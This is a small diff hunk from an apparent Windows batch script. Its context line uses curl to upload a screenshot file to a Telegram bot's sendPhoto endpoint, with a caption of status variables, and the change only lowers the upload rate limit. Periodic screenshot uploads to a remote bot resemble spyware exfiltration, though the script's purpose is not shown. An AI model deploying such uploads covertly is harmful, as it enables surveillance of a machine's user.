@@ -440,7 +440,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
      -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
      -F "caption=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%CRBRSSTATUS%|%time%|%BATCHVERSION%|%ADBCLEANMSG%" ^
      -F "photo=@%FILE_PATH_MyScrn%" ^
-     --limit-rate 30K
+     --limit-rate 20K
 
 
 
